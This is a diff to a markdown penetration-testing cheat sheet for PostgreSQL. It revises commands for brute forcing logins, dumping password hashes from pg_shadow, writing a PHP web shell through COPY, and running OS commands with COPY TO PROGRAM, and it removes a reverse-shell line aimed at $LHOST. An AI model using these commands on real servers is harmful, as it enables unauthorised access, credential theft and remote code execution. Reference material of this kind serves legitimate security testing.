@@ -8,7 +8,7 @@
 ## Enumeration
 
 ```bash
-nmap -p 5432 --script pgsql-brute $IP
+nmap -sV -p 5432 $IP
 ```
 
 ---
@@ -27,25 +27,32 @@ Common credentials: `postgres:postgres`, `postgres:admin`, `admin:admin`
 ## Brute Force
 
 ```bash
-hydra -L users.txt -P passwords.txt postgres://$IP
+nmap -p 5432 --script pgsql-brute \
+  --script-args 'userdb=users.txt,passdb=passwords.txt,brute.guesses=3' $IP
 ```
+
+Adjust `brute.guesses` to remain below the approved attempt limit.
 
 ---
 
 ## Enumeration Queries
 
 ```sql
-\list                                   -- list databases
-\c database_name                        -- connect to database
-\dt                                     -- list tables
-SELECT version();                       -- PostgreSQL version
-SELECT current_user;                    -- current user
-SELECT usename, passwd FROM pg_shadow;  -- password hashes (superuser only)
+\list
+\c DATABASE_NAME
+\dt
+SELECT version();
+SELECT current_user;
+SELECT usename, passwd FROM pg_shadow;
 ```
+
+The first three lines are `psql` meta-commands for listing databases, changing databases, and listing relations. Reading `pg_shadow` requires elevated privileges.
 
 ---
 
 ## File Read / Write (COPY)
+
+Server-side file operations require superuser or the relevant predefined role: `pg_read_server_files` for reads and `pg_write_server_files` for writes. Paths and permissions are evaluated as the PostgreSQL operating-system account.
 
 Read a file from the host:
 
@@ -65,18 +72,12 @@ COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';
 
 ## OS Command Execution (COPY TO/FROM PROGRAM)
 
-Available in PostgreSQL 9.3+:
+`COPY ... PROGRAM` is available in PostgreSQL 9.3+ but requires superuser or membership in `pg_execute_server_program`:
 
 ```sql
-COPY (SELECT '') TO PROGRAM 'id > /tmp/out.txt';
+COPY (SELECT '') TO PROGRAM 'id > /tmp/pg-copy-program.txt';
 COPY tmp FROM PROGRAM 'id';
 SELECT * FROM tmp;
-```
-
-Reverse shell:
-
-```sql
-COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/$LHOST/9001 0>&1"';
 ```
 
 ---
@@ -85,7 +86,7 @@ COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/$LHOST/9001 0>&1"';
 
 ```sql
 SELECT current_user, usesuper FROM pg_user WHERE usename = current_user;
+SELECT rolname FROM pg_roles
+WHERE pg_has_role(current_user, oid, 'member')
+  AND rolname IN ('pg_read_server_files','pg_write_server_files','pg_execute_server_program');
 ```
-
-!!! tip "Real-world"
-    PostgreSQL is common in Linux environments and often runs as the `postgres` OS user. If you get RCE via `COPY TO PROGRAM`, you're executing as that user. Check `sudo -l` immediately. Trust authentication (`pg_hba.conf`) misconfiguration is the most common finding: connections from `127.0.0.1/32` allowed without a password.
